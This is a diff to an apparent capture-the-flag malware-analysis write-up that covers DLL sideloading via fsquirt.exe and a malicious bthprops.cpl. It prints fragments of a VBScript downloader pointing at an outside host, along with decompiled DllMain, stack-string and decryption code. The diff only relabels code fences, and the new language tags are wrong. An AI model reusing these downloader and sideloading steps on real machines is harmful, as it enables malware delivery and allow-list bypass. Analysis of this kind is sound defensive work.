@@ -176,7 +176,7 @@ The logic here is very specific and indicates a **DLL Sideloading** attack.
 
 **Why?** Windows looks for DLLs in the *current directory* before the system directories. `fsquirt.exe` expects to load `bthprops.cpl` from functionality purposes. By placing a malicious `bthprops.cpl` next to it, the legitimate executable loads our malware. This is often done to bypass allow-listing (since `fsquirt.exe` is a signed Microsoft binary).
 
-```C++
+```html
 u = "http://gifts.bemyvalentine.thm/"
 p = t & "\valentine"
 s = o.ExpandEnvironmentStrings("%SYSTEMROOT%")
@@ -206,7 +206,7 @@ We execute the malware's plan in a controlled environment or statically analyze 
 
 We look at `DllMain`, the entry point for DLLs.
 
-```C
+```shell
 undefined8 DllMain(HMODULE param_1,uint param_2)
 {
   if ((((param_2 < 4) && (param_2 < 2)) && (param_2 != 0)) && (param_2 == 1)) {
@@ -223,7 +223,7 @@ When the process attaches (`param_2 == 1`), it calls `_p()`. This confirms the m
 
 Inside `_p()`, we see a stack-string construction technique. The malware builds a command string character by character (or chunk by chunk) to avoid static string analysis. It also calls `_d()`, which appears to be a decryption function.
 
-```C
+```shell
 void _p(void)
 {
   // ... stack setup
@@ -239,7 +239,7 @@ void _p(void)
 
 Analyzing `_d`, we can reconstruct the custom encryption algorithm.
 
-```C
+```javascript
 void _d(longlong param_1,longlong param_2,ulonglong param_3)
 {
   undefined8 local_10;
